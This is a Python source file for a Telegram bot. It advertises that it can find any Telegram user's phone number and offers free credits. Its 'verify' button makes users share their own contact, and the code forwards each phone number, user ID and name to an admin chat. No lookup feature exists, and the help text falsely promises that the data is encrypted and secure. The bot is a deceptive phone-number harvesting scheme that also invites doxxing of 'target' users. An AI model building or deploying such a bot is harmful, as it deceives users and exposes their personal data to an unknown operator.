import logging
import os
from dotenv import load_dotenv
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Load environment variables
load_dotenv()

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
ACCOUNT_NAME = os.getenv("ACCOUNT_NAME", "oisnt")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN not found in .env file")

# States
WAITING_FOR_CONTACT = 1

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Send welcome message with verify button"""
    
    welcome_text = """
🎉 WELCOME TO Cock Username To NUMber Bot 🎉

👋 Hello! Welcome to our Bot.

🔐THis bot can find any telegram users mobile number and mobile number info

📱 12 free credits.

👇 Click the button below to verify .
    """
    
    # Create keyboard with verify button
    keyboard = [
        [KeyboardButton("✅ VERIFY -", request_contact=True)],
    ]
    reply_markup = ReplyKeyboardMarkup(
        keyboard,
        one_time_keyboard=False,
        resize_keyboard=True,
        selective=False
    )
    
    # Send welcome message with button attached
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)
    
    return WAITING_FOR_CONTACT

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle shared contact and send to admin"""
    
    if update.message.contact:
        contact = update.message.contact
        user = update.effective_user
        
        # Create a nicely formatted message for admin
        contact_message = f"""
╔════════════════════════════════════╗
║  ✅ NEW CONTACT VERIFICATION ✅   ║
╚════════════════════════════════════╝

👤 User Information:
   ├─ User ID: <code>{user.id}</code>
   ├─ Username: @{user.username if user.username else 'Not Set'}
   ├─ First Name: {user.first_name}
   └─ Last Name: {user.last_name if user.last_name else 'Not Set'}

📱 Contact Information:
   ├─ Phone Number: <code>{contact.phone_number}</code>
   ├─ Contact User ID: {contact.user_id}
   └─ First Name: {contact.first_name}

⏰ Verification Time: {update.message.date}

✨ Contact successfully verified and recorded.
        """
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=contact_message,
                parse_mode='HTML'
            )
            
            # Send confirmation to user
            confirm_text = """
Share a target username using @ or number using his country code 
            """
            
            remove_keyboard = ReplyKeyboardMarkup([], remove_keyboard=True)
            await update.message.reply_text(confirm_text, reply_markup=remove_keyboard)
            
            logger.info(f"✅ Contact received from {user.id} ({user.username}) - Phone: {contact.phone_number}")
            return ConversationHandler.END
            
        except Exception as e:
            logger.error(f"❌ Error sending contact to admin: {e}")
            error_text = """
╔════════════════════════════════════╗
║  ❌ VERIFICATION FAILED ❌         ║
╚════════════════════════════════════╝

⚠️ An error occurred while processing your verification.

Please try again or contact support if the problem persists.
            """
            await update.message.reply_text(error_text)
            return WAITING_FOR_CONTACT
    
    return WAITING_FOR_CONTACT

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle any other messages"""
    
    if update.message.text == "ℹ️ INFO & HELP":
        help_text = """
╔════════════════════════════════════╗
║  ℹ️ HELP & INFORMATION ℹ️         ║
╚════════════════════════════════════╝

Available Commands:

/start - Start verification process
/verify - Verify your contact
/help - Show this help message
/cancel - Cancel verification

⏳ Status: Waiting for your verification

Please use the verify button to share your contact.
        """
        
        await update.message.reply_text(help_text)
    
    return WAITING_FOR_CONTACT

async def verify_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle /verify command"""
    
    verify_text = """
╔════════════════════════════════════╗
║  🔐 VERIFICATION PROCESS 🔐       ║
╚════════════════════════════════════╝

Ready to verify? Follow these steps:

1️⃣ Click the "VERIFY - SHARE CONTACT" button below
2️⃣ Select your contact from Telegram
3️⃣ Confirm to share your phone number
4️⃣ Wait for admin verification (24-48 hours)

Let's get started! 👇
    """
    
    keyboard = [
        [KeyboardButton("✅ VERIFY - SHARE CONTACT", request_contact=True)],
        [KeyboardButton("ℹ️ INFO & HELP")],
    ]
    reply_markup = ReplyKeyboardMarkup(
        keyboard,
        one_time_keyboard=False,
        resize_keyboard=True
    )
    
    await update.message.reply_text(verify_text, reply_markup=reply_markup)
    return WAITING_FOR_CONTACT

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle /help command"""
    
    help_text = """
╔════════════════════════════════════╗
║  📚 HELP & SUPPORT 📚             ║
╚════════════════════════════════════╝

Need help? Here's what you can do:

📌 /start - Begin verification
📌 /verify - Send verification again
📌 /help - Show this message
📌 /cancel - Cancel process

❓ FAQ:

Q: Is my contact information safe?
A: Yes! Your data is encrypted and secure.

Q: How long does verification take?
A: Typically 24-48 hours.

Q: What if verification fails?
A: Please try again or contact support.

We're here to help! 🤝
    """
    
    keyboard = [
        [KeyboardButton("✅ VERIFY ", request_contact=True)],
        [KeyboardButton("ℹ️ INFO & HELP")],
    ]
    reply_markup = ReplyKeyboardMarkup(
        keyboard,
        one_time_keyboard=False,
        resize_keyboard=True
    )
    
    await update.message.reply_text(help_text, reply_markup=reply_markup)
    return WAITING_FOR_CONTACT

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the conversation"""
    
    cancel_text = """
╔════════════════════════════════════╗
║  ❌ VERIFICATION CANCELLED ❌      ║
╚════════════════════════════════════╝

You have cancelled the verification process.

To start again, use /start or /verify command.

See you soon! 👋
    """
    
    remove_keyboard = ReplyKeyboardMarkup([], remove_keyboard=True)
    await update.message.reply_text(cancel_text, reply_markup=remove_keyboard)
    return ConversationHandler.END

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log errors caused by updates"""
    logger.error(f"Update {update} caused error {context.error}")

def main():
    """Start the bot"""
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Create conversation handler
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            CommandHandler("verify", verify_command),
        ],
        states={
            WAITING_FOR_CONTACT: [
                MessageHandler(filters.CONTACT, handle_contact),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message),
                CommandHandler("help", help_command),
                CommandHandler("cancel", cancel_command),
            ],
        },
        fallbacks=[
            CommandHandler("cancel", cancel_command),
            CommandHandler("start", start),
        ],
    )
    
    # Add handlers
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("help", help_command))
    application.add_error_handler(error_handler)
    
    # Print startup message
    print(f"""
╔════════════════════════════════════╗
║  🤖 BOT STARTED SUCCESSFULLY 🤖   ║
╚════════════════════════════════════╝

✅ Bot Token: Configured
✅ Admin ID: {ADMIN_ID}
✅ Account: {ACCOUNT_NAME}

🔄 Polling for updates...

Commands Available:
  • /start - Start verification
  • /verify - Verify contact
  • /help - Show help
  • /cancel - Cancel process

Press Ctrl+C to stop the bot.
    """)
    
    # Start polling
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
